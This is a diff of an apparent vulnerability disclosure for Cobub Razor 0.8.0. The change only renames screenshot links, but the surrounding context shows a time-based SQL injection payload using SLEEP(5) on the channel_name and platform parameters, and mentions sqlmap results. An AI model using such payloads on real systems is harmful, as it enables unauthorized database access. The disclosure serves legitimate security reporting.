@@ -67,11 +67,11 @@ Payload(This string is also applied to 'platform' at the same time):
 2.channel_name=test" AND SLEEP(5)-- NklJ&platform=1
 ```
 Input special characters ["] can cause an error in the SQL syntax:  
-![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_1.png)  
+![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_1.png)  
 Use manual injection:  
-![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_2.png)
+![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_2.png)
 SQLmap results:  
-![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_3.png)
-![image](https://github.com/Kyhvedn/CVE_Description/blob/master/sql_4.png)
+![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_3.png)
+![image](https://github.com/Kyhvedn/CVE_Description/blob/master/Cobub_Razor_0.8.0_sql_4.png)
 
 
